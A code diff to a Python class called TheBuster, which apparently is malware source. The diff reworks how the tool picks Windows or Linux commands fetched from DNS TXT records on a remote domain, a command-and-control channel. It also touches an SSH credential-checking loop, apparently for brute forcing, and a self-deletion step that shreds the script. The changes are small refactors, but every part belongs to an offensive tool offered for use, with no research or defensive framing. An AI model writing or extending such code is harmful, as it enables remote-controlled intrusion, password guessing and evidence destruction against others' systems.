@@ -135,9 +135,6 @@ class TheBuster:
 
     def discern(self):
 
-        is_windows = platform.system().lower() == "windows"
-        is_linux = platform.system().lower() == "linux"
-
         txt_records = dns.resolver.resolve('sub.dom.com', 'TXT')
 
         self.win_1_cmd = None
@@ -162,17 +159,17 @@ class TheBuster:
                     elif entry.startswith("lin_2: "):
                         self.lin_2_cmd = entry.split(": ", 1)[1]
 
-        if is_linux:
-            if self.lin_1_cmd:
-                return self.lin_1_cmd
-            if self.lin_2_cmd:
-                return self.lin_2_cmd
-
-        elif is_windows:
+        if self.IS_WINDOWS:
             if self.win_1_cmd:
                 return self.win_1_cmd
             if self.win_2_cmd:
                 return self.win_2_cmd
+
+        else:
+            if self.lin_1_cmd:
+                return self.lin_1_cmd
+            if self.lin_2_cmd:
+                return self.lin_2_cmd
 
 # --------------------------------------------------------------------------------------
 
@@ -238,7 +235,7 @@ class TheBuster:
                 if found_valid_credentials:
                     break
 
-  # --------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------
 
     def is_ssh_open(self, ipaddr, username, password):
 
@@ -282,7 +279,6 @@ class TheBuster:
         else:
             print("[*] Deleting script using `shred` (Linux)")
             subprocess.run(["shred", "-fuz", self_path], shell=True)
-
 
 # --------------------------------------------------------------------------------------
 
